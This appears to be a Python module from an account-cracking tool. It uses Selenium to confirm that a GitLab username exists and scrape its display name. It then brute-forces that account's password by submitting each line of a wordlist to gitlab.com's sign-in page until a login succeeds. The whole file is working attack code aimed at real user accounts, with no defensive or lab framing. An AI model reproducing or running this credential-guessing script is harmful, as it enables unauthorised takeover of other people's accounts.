import time
from selenium.webdriver.common.keys import Keys


class Gitlab:

    def __init__(self, browser):
        self.browser = browser

    def set_config(self, username, wordlist, delay):
        self.username = username
        self.name = ''
        self.wordlist = wordlist
        self.delay = delay
        self.url = 'https://gitlab.com/users/sign_in'

    def check_user(self):
        self.browser.driver.get('https://gitlab.com/%s' % self.username)
        if self.username in self.browser.driver.title:
            name = self.browser.driver.find_element_by_xpath(
                '//*[@id="content-body"]/div[2]/div[1]/div[2]/div[2]/div[1]')
            self.name = name.text
            return True
        else:
            return False

    def crack(self):
        passwords = []
        found = ''
        with open(self.wordlist, 'r') as f:
            for line in f:
                passwords.append(line.strip('\n'))
        for password in passwords:
            self.browser.driver.get(self.url)
            email = self.browser.wait_until_element_exists('id', 'user_login')
            email.clear()
            email.send_keys(self.username)
            pwd = self.browser.driver.find_element_by_id('user_password')
            pwd.clear()
            pwd.send_keys(password)
            pwd.send_keys(Keys.RETURN)

            self.browser.wait_page_loaded()

            url = self.browser.driver.current_url
            if (url != self.url) and ('sign_in' not in url):
                found = password
                break
            time.sleep(self.delay)

        return found
